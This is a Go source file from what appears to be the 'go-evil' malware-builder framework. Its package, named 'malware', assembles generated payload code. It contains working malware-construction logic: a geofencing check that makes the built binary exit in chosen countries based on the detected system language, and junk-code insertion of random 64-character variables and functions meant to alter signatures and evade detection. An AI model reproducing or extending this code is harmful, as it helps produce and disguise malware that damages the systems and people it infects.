package malware

import (
	"os"
	"strconv"
	"strings"

	"github.com/s9rA16Bf4/go-evil/utility/contains"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
	"github.com/thanhpk/randstr"
)

type malware_t struct {
	malware_name     string   // Malware name (This is the binary name of the file)
	content          []string // The code that the malware does will be contained here
	extension        string
	disabled_domains []string // Domains that were disabled, and will not be included in the final binary
	disabled_regions []string // Regions/countries that the malware will not run on
}

var c_malw malware_t

// System area
func AddContent(new_cont string) {
	allowed_to_add := true
	for _, domain := range c_malw.disabled_domains {
		if contains.StartsWith(new_cont, []string{domain}) {
			allowed_to_add = false
			break
		}
	}
	if allowed_to_add {
		c_malw.content = append(c_malw.content, new_cont)
	}
}
func GetName() string {
	return c_malw.malware_name
}
func GetContent() []string {
	return c_malw.content
}
func GetExtension() string {
	return c_malw.extension
}
func Disable_domain(domain string) {
	c_malw.disabled_domains = append(c_malw.disabled_domains, domain)
}
func Is_disabled(domain string) bool {
	toReturn := false

	for _, disabled_domain := range c_malw.disabled_domains {
		if contains.StartsWith(domain, []string{disabled_domain}) {
			toReturn = true
			break
		}
	}

	return toReturn
}

func Disable_region(country string) {
	c_malw.disabled_regions = append(c_malw.disabled_regions, "\""+country+"\"")
}
func Region_is_disabled() []string {
	var content = []string{"region, _ := jibber_jabber.DetectLanguage()"}
	content = append(content, "var disabled_regions = []string{")
	for _, region := range c_malw.disabled_regions {
		content = append(content, region+",")
	}
	content = append(content, "}")

	var line = `for _, disabled_region := range disabled_regions {
		if region == disabled_region {
			return
		}
	}`
	content = append(content, strings.Split(line, "\n")...)
	return content
}

func Get_malware_location() string {
	location, err := os.Executable()
	if err != nil {
		notify.Error(err.Error(), "malware.Get_malware_location()")
	}
	toReturn := ""
	temp := ""
	for _, c := range location {
		temp += string(c)
		if c == '/' {
			toReturn += temp
			temp = ""
		}
	}
	SetBinaryName(temp)
	return toReturn
}

// User manipulative area
func SetExtension(new_ext string) {
	if new_ext[0:1] != "." { // Add the . if the user didn't supply it
		new_ext = "." + new_ext
	}
	if c_malw.extension == "" {
		c_malw.extension = new_ext
	}
}

func SetBinaryName(new_name string) {
	if c_malw.malware_name == "" {
		c_malw.malware_name = new_name
	}
}

func AddRandomVariable() {
	var new_var string
	for {
		new_var = randstr.String(64)
		if _, err := strconv.Atoi(string(new_var[0])); err != nil { // It can't start with a number
			break
		}
	}

	AddContent("var " + new_var + " string")

	var new_func string
	for {
		new_func = randstr.String(64)
		if _, err := strconv.Atoi(string(new_func[0])); err != nil { // It can't start with a number
			break
		}
	}
	AddContent(new_func + " := func(v string){}")
	AddContent(new_func + "(" + new_var + ")")
}

func AddRandomFunction() {
	var new_func string
	for {
		new_func = randstr.String(64)
		if _, err := strconv.Atoi(string(new_func[0])); err != nil { // It can't start with a number
			break
		}
	}
	AddContent(new_func + " := func(){}")
	AddContent(new_func + "()")
}
